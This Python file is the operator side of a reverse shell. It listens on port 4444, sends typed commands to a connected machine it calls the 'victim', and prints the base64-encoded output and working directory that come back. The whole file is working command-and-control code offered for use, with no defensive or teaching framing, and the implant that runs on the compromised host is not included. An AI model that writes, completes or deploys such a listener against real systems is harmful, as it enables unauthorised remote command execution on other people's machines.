import socket
import json
import base64

def listen_on(ip, port):
    global target

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((ip, port))
    listener.listen(0)
    print("Listening...")
    target, address = listener.accept()
    print(f"Connection from {address} established.")

def send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode('utf-8'))

def receive():
    json_data = ''
    while True:
        try:
            chunk = target.recv(1024)
            if not chunk:
                raise ConnectionResetError("connection closed by peer")
            json_data += chunk.decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue
def server_run():
    cwd = "~"
    try:
        initial = receive()
        cwd = initial.get("cwd", "~")
        while True:
            command = input(f"{cwd} $ ")
            if command.strip().lower() in ("exit", "quit"):
                send({"cmd": "exit"})
                break
            send({"cmd": command})
            response = receive()
            output = base64.b64decode(response.get("output", "")).decode(
                "utf-8", errors="replace"
            )
            if output:
                print(output, end="" if output.endswith("\n") else "\n")
            cwd = response.get("cwd", cwd)
    except (ConnectionResetError, BrokenPipeError, OSError):
        print("[*] Connection closed by victim.")
    finally:
        target.close()


if __name__ == "__main__":
    ip = input("Listen on IP: ").strip()
    listen_on(ip, 4444)
    server_run()
